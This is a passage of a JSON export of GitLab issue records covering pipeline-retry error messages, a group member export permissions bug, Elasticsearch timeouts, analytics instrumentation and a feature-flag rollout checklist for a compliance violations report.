Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346308","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346308","notes":"https://gitlab.com/api/v4/projects/278964/issues/346308/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346308/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346308","relative":"#346308","full":"gitlab-org/gitlab#346308"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7805,"epic":{"id":485503,"iid":7805,"title":"Security Training 2.0","url":"/groups/gitlab-org/-/epics/7805","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97769173,"iid":346304,"project_id":278964,"title":"Backend: Add more detail to 403 error message when user needs a validated credit card to perform pipeline actions","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Problem\n\nThe 403 error message returned when a user is not authenticated does not have enough information to show useful information in the frontend.\n\n### Proposal\n\nAdd an error message, to the api response(backend only) that says `Credit card required to be on file in order to retry a build` to match the error we return from same failure in the retry action for jobs\n\n#### Steps\n\nFrom https://gitlab.com/gitlab-org/gitlab/-/issues/346304#note_824667142\n\n---\n\n1. Refactor [RetryPipelineService](https://gitlab.com/gitlab-org/gitlab/-/blob/032df04985e0b82c04ec176a8ace3f73b9c7addf/app/services/ci/retry_pipeline_service.rb) and [RetryBuildService](https://gitlab.com/gitlab-org/gitlab/-/blob/032df04985e0b82c04ec176a8ace3f73b9c7addf/app/services/ci/retry_build_service.rb) to use response objects instead of exceptions\n1. Transform the response objects into usable error messages for the RESTful API and GraphQL\n\n#### Technical details\n\nFrom https://gitlab.com/gitlab-org/gitlab/-/issues/346304#note_824667142\n\n---\n\nThe pipeline retry service is built on top of the jobs retry service by looping through the failed jobs and [calling the retry job service](https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/services/ci/retry_pipeline_service.rb#L14-18) for all of them. Both services use exceptions to control the execution flow.\n\nFor pipelines we have three ways in which we can call the retry service:\n\n* RESTful API: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/lib/api/ci/pipelines.rb#L216-230\n* Rails API and web: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/controllers/projects/pipelines_controller.rb#L168-179 - this one is interesting because it schedules the retry to be executed async\n* GraphQL: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/graphql/mutations/ci/pipeline/retry.rb#L16-25\n\nIt looks like `GraphQL` is used for the retry button on the show pipeline page, but it doesn't handle the `AccessDeniedError` exceptions and it returns a `500` error with this body:\n\n![image](https://gitlab.com/gitlab-org/gitlab/uploads/3cee3fd2f1706addc6e8f4da124a5548/image.png)\n\nFor [Rails](https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/controllers/application_controller.rb#L88-90) and [API](https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/lib/api/api.rb#L82-85) we have generic code that transforms these exceptions into `403` responses. Modifying these handlers to include the error message might turn into a security problem if we end up showing a message that we're not supposed to because this change has far reaching impact.\n\nFor jobs we have more than one way to retry as well:\n\n* RESTful API: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/lib/api/ci/jobs.rb#L106-122\n* Rails web: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/controllers/projects/jobs_controller.rb#L77-82 used from job log page and this is interesting because it's also used as an API by the retry icon: ![image](https://gitlab.com/gitlab-org/gitlab/uploads/7bb171f614bb01307b85dd20ac35ae78/image.png)\n* GraphQL: https://gitlab.com/gitlab-org/gitlab/-/blob/82f1ec0fdb67e6b557e0c1caab6b0896bbaf0704/app/graphql/mutations/ci/job/retry.rb#L16-25","state":"closed","created_at":"2021-11-22T22:24:29.783Z","updated_at":"2022-05-06T15:11:43.709Z","closed_at":"2022-03-22T15:07:37.978Z","closed_by":{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"},"labels":["Category:Continuous Integration","Stretch","Verify::P2","auto updated","backend","devops::verify","documentation","group::pipeline execution","pipeline abuse prevention","section::ops","type::maintenance","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"}],"author":{"id":4512666,"username":"jheimbuck_gl","name":"James Heimbuck","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8dd2ef9c1cacb6e80d7ca47db6f0ce22?s=80\u0026d=identicon","web_url":"https://gitlab.com/jheimbuck_gl"},"type":"ISSUE","assignee":{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346304","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346304","notes":"https://gitlab.com/api/v4/projects/278964/issues/346304/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346304/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346304","relative":"#346304","full":"gitlab-org/gitlab#346304"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97763854,"iid":346296,"project_id":278964,"title":"Group export: Inherited members listed with unexpected permissions","description":"### Problem to solve\n\nFrom @stkerr in [Slack#g_manage_compliance on 2021-11-19](https://gitlab.slack.com/archives/CN7C8029H/p1637340441207100):\n\n\u003e I tried to export group members as CSV \u0026 seeing some behavior I don’t quite understand. I had shares the Demo Projects group with Max Role Reporter. In the CSV export, the inherited members are listed with the permissions from the Demo Projects group though (so Owner/Maintainer), rather than the Reporter role that they got from the group. Thoughts? Is this likely related to the reporting aspect or do you think the actual access works like this too?\n\n\u003cdetails\u003e\n\u003csummary\u003eScreenshot\u003c/summary\u003e\n![image](/uploads/e2f17dbbc3ee4ee5df8be7e7109b49ba/image.png)\n\u003c/details\u003e\n\n@mwoolf replied: \"I assume the issue here is the user might have higher access in a parent group, possibly?\"\n\n### Proposal\n\nThe export should reflect each user's access scoped to the particular group or project, not their max access level.","state":"closed","created_at":"2021-11-22T20:22:13.187Z","updated_at":"2021-12-10T19:05:39.093Z","closed_at":"2021-12-10T19:05:39.073Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["Next Up","[deprecated] Accepting merge requests","backend","customer","devops::manage","group::compliance","section::dev","severity::3","type::bug","workflow::scheduling"],"milestone":null,"assignees":[],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346296","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346296","notes":"https://gitlab.com/api/v4/projects/278964/issues/346296/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346296/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346296","relative":"#346296","full":"gitlab-org/gitlab#346296"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97757842,"iid":346288,"project_id":278964,"title":"Faraday TimeoutErrors happening for Elastic searches \u003e= 5s","description":"It looks like the changes in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/73650 on 11/15/2021 introduced a bug where some searches over `5s` get a `Faraday::TimeoutError`. I presume this is from the Elasticsearch gem setting a client-side timeout in `Faraday` when reaching out to Elasticsearch. Need to confirm.\n\n![image](/uploads/bffba706605f94daa7d7eb8584521d51/image.png)","state":"closed","created_at":"2021-11-22T18:09:26.123Z","updated_at":"2022-07-21T20:17:55.219Z","closed_at":"2022-02-10T02:05:34.654Z","closed_by":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"labels":["Category:Global Search","[deprecated] Accepting merge requests","auto updated","devops::data_stores","group::global search","section::enablement"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[],"author":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"type":"ISSUE","assignee":null,"user_notes_count":17,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346288","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346288","notes":"https://gitlab.com/api/v4/projects/278964/issues/346288/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346288/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346288","relative":"#346288","full":"gitlab-org/gitlab#346288"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97757356,"iid":346285,"project_id":278964,"title":"VSA: Instrument how many custom value streams have been created","description":"\u003c!--\n* Use this issue template for creating requests to track snowplow events\n* Snowplow events can be both Frontend (javascript) or Backend (Ruby)\n* Snowplow is currently not used for self-hosted instances of GitLab - Self-hosted still rely on usage ping for product analytics - Snowplow is used for GitLab SaaS\n* You do not need to create an issue to track generic front-end events, such as All page views, sessions, link clicks, some button clicks, etc.\n* What you should capture are specific events with defined business logic. For example, when a user creates an incident by escalating an existing alert, or when a user creates and pushes up a new Node package to the NPM registry.\n* For more details read https://about.gitlab.com/handbook/business-technology/data-team/programs/data-for-product-managers/\n --\u003e\n\n## Purpose of this tracking event\n\nTo understand how many custom value streams are being created.\n(This is a [first iteration toward tracking users who create custom value streams](https://gitlab.com/gitlab-org/gitlab/-/issues/346214#note_740300250).)\n\n\n\u003c!--\nWe generally recommend events be tracked using a [structured event](https://docs.snowplowanalytics.com/docs/understanding-tracking-design/out-of-the-box-vs-custom-events-and-entities/#structured-events) which has 5 properties you can use. There may be instances where structured events are not sufficient. You may want to track an event where the property changes frequently or is general something very unique. In those cases, use a [self-describing event](https://docs.snowplowanalytics.com/docs/understanding-tracking-design/out-of-the-box-vs-custom-events-and-entities/#self-describing-events)\n\n--\u003e\n\n## Structured Snowplow events to track\n\n* Category: The page or backend area of the application. Unless infeasible, please use the Rails page attribute by default in the frontend, and namespace + classname on the backend. If you're not sure what it is, work with your engineering manager to figure it out.\n* Action: A string that is used to define the user action. The first word should always describe the action or aspect: clicks should be `click`, activations should be `activate`, creations should be `create`, etc. Use underscores to describe what was acted on; for example, activating a form field would be `activate_form_input`. An interface action like clicking on a dropdown would be `click_dropdown`, while a behavior like creating a project record from the backend would be `create_project`\n* Label: Optional. The specific element, or object that's being acted on. This is either the label of the element (e.g. a tab labeled 'Create from template' may be `create_from_template`) or a unique identifier if no text is available (e.g. closing the Groups dropdown in the top navbar might be `groups_dropdown_close`), or it could be the name or title attribute of a record being created.\n* Property: Optional. Any additional property of the element, or object being acted on.\n* Value: Optional, numeric. Describes a numeric value or something directly related to the event. This could be the value of an input (e.g. `10` when clicking `internal` visibility)\n\n| Category | Action | Label | Property | Feature Issue | Additional Information |\n| ------ | ------ | ------ | ------ | ------ | ------ |\n| cell | cell | cell | cell | cell | cell |\n| cell | cell | cell | cell | cell | cell |\n\n\u003c!--\n  Snowplow event tracking starts with instrumentation and completed after a chart is created in Sisense.\n\n  Use this checklist to ensure all steps are completed\n--\u003e\n\n## Snowplow event tracking checklist\n* [ ] Engineering complete work and deploy changes to GitLab SaaS\n* [ ] Verify the new Snowplow events are listed in the [Snowplow Event Exploration](https://app.periscopedata.com/app/gitlab/539181/Snowplow-Event-Exploration---last-30-days) dashboard\n* [ ] Create chart(s) to track your event(s) in the relevant dashboard\n  * [ ] Use the [Chart Snowplow Actions](https://app.periscopedata.com/app/gitlab/snippet/Chart-Snowplow-Actions/5546da87ae2c4a3fbc98415c88b3eedd/edit) SQL snippet to quickly visualize usage. See [example](https://app.periscopedata.com/app/gitlab/737489/Health-Group-Dashboard?widget=9797112\u0026udv=0)\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-11-22T17:58:27.676Z","updated_at":"2022-05-25T00:05:15.991Z","closed_at":"2021-12-20T17:10:06.026Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["[deprecated] Accepting merge requests","backend","devops::manage","group::optimize","instrumentation","product intelligence","section::dev","type::maintenance","workflow::scheduling"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346285","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346285","notes":"https://gitlab.com/api/v4/projects/278964/issues/346285/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346285/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346285","relative":"#346285","full":"gitlab-org/gitlab#346285"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97757116,"iid":346284,"project_id":278964,"title":"Add a GraphQL resolver to get a project's pipeline counts by scopes and source","description":"In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74605, we have implemented a Vue app that polls for a project's on-demand scan counts every second. The request currently relies on a single GraphQL transaction that triggers an SQL query for each requested scope (`all`, `running` and `finished`). In order to reduce the load on the database, let's implement a dedicated resolver that will:\n\n- [x] Get the whole pipeline list in a single SQL query.\n- [x] Count the pipelines for each requested scope by looping through the list.\n- [x] Limit the counts to 1000 entries (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75372#note_751144288).\n\nOnce the resolver is implemented, we should:\n\n- [x] Leverage it in `ee/app/helpers/projects/on_demand_scans_helper.rb` to get all counts from a SSoT.\n\nRelated discussions:\n* https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74605#note_738550265\n* https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74605#note_738546575","state":"closed","created_at":"2021-11-22T17:52:38.026Z","updated_at":"2022-02-14T10:07:56.846Z","closed_at":"2022-02-14T10:07:56.831Z","closed_by":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"labels":["GraphQL","backend","bug::performance","devops::secure","frontend","group::dynamic analysis","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"}],"author":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"type":"ISSUE","assignee":{"id":3732265,"username":"pgascouvaillancourt","name":"Paul Gascou-Vaillancourt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a190c0b1ff5772c9230b4d9a38ac608?s=80\u0026d=identicon","web_url":"https://gitlab.com/pgascouvaillancourt"},"user_notes_count":5,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346284","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346284","notes":"https://gitlab.com/api/v4/projects/278964/issues/346284/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346284/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346284","relative":"#346284","full":"gitlab-org/gitlab#346284"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":97752673,"iid":346274,"project_id":278964,"title":"Primary email is listed as secondary email","description":"\n### Summary\n\nWith the latest release in the admin area (as of date of issue creation, it's GitLab 14.5.0-pre 26f6d1e8145), the primary email is also listed as secondary email. This is a little confusing as email address has unique validation in place.  \n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\n### Steps to reproduce\n\n* On any latest GitLab install, take any account and check the user in admin view.\n\n\n### What is the current *bug* behavior?\n\nIt is showing primary and secondary email as the same, and it's confusing when performing any admin level operation.\n\n### What is the expected *correct* behavior?\n\n* The primary email should not be listed as secondary email.\n\n### Relevant logs and/or screenshots\n\n\n![Screenshot_2021-11-22_at_9.48.14_PM](/uploads/edfc5e4faeb531ba8e1f0b32337bd276/Screenshot_2021-11-22_at_9.48.14_PM.png)\ncc// @m_frankiewicz","state":"closed","created_at":"2021-11-22T16:34:43.506Z","updated_at":"2021-12-01T10:22:56.604Z","closed_at":"2021-12-01T10:22:56.587Z","closed_by":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"labels":["admin dashboard","devops::manage","group::optimize","section::dev","type::bug","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"}],"author":{"id":581582,"username":"arihantar","name":"Arihant","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd6c70e8b8153eb2cbaec373628ef394?s=80\u0026d=identicon","web_url":"https://gitlab.com/arihantar"},"type":"ISSUE","assignee":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346274","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346274","notes":"https://gitlab.com/api/v4/projects/278964/issues/346274/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346274/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346274","relative":"#346274","full":"gitlab-org/gitlab#346274"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97744915,"iid":346266,"project_id":278964,"title":"[Feature flag] Enable compliance violations report","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to roll out [the feature](https://gitlab.com/groups/gitlab-org/-/epics/6870) on production,\nthat is currently behind the `compliance_violations_report` feature flag.\n\nThe compliance violations report updates the existing compliance dashboard with a new table that pulls in individual violations from merged MR's. Previously, these were dynamically calculated when the dashboard was loaded and was limited to the most recent merged MR of a given project. Now with https://gitlab.com/groups/gitlab-org/-/epics/7222 these violations are saved when the MR is merged and are passed to the ~frontend via GraphQL.\n\nThis will improve the usability of the compliance report, make it more performant and give us the tools to expand its feature set.\n\n## Owners\n\n- Team: Manage::Compliance\n- Most appropriate slack channel to reach out to: `#g_manage_compliance`\n- Best individual to reach out to: @rob.hunt\n- PM: @stkerr \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWe swap over the UI without issues\n\n### When is the feature viable?\n\nOnce the feature flag is rolled out\n\n### What might happen if this goes wrong?\n\nTurn off the feature flag\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set compliance_violations_report true --dev`\n    - [x] `/chatops run feature set compliance_violations_report true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --group=gitlab-org compliance_violations_report true`\n    - [x] `/chatops run feature set --group=gitlab-com compliance_violations_report true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Crosslink the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the on-call SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/6870) an estimated time this will be enabled on GitLab.com.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set compliance_violations_report \u003crollout-percentage\u003e --actors`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set compliance_violations_report true`\n- [x] Announce on [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/6870) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/6870) to indicate the feature will be released in the 